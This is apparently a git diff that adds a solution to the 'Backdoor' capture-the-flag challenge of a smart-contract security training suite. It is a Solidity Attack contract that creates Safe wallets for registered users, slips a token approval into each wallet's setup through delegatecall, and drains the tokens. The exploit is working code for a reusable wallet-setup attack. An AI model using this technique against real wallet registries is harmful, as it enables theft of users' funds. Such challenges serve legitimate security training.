@@ -7,6 +7,7 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +71,8 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        Attack attacker = new Attack(walletFactory, singletonCopy, users, token, recovery, walletRegistry);
+        attacker.attack();
     }
 
     /**
@@ -92,5 +94,58 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract Attack {
+    SafeProxyFactory walletFactory;
+    Safe singletonCopy;
+    address[] users;
+    DamnValuableToken token;
+    address recovery;
+    WalletRegistry walletRegistry;
+
+    constructor(SafeProxyFactory _walletFactory, Safe _singletonCopy, address[] memory _users, DamnValuableToken _token, address _recovery, WalletRegistry _walletRegistry) {
+        walletFactory = _walletFactory;
+        users = _users;
+        singletonCopy = _singletonCopy;
+        token = _token;
+        recovery = _recovery;
+        walletRegistry = _walletRegistry;
+    }
+
+    function attack() external {
+        address[] memory owners = new address[](1);
+
+        // Set up each wallet and slip in a token transfer approval as that user 
+        for (uint i = 0; i < 4; i++) {
+            owners[0] = users[i];
+
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                address(singletonCopy), 
+                abi.encodeCall(
+                    Safe.setup, (
+                        owners,
+                        1, // Forced
+                        address(this), 
+                        abi.encodeCall(this.approve, (token, address(this))), 
+                        address(0x0), // Forced
+                        address(token), 
+                        0, // We don't have any tokens yet
+                        payable(recovery))
+                ), 
+                0, 
+                walletRegistry
+            );
+
+            token.transferFrom(address(proxy), address(recovery), 10e18);
+        }
+    }
+
+    receive() payable external {}
+
+    // This method will be delegatecall'd (Executor.sol) as the SafeProxy
+    function approve(DamnValuableToken tk, address spender) external {
+        tk.approve(spender, type(uint256).max);
     }
 }
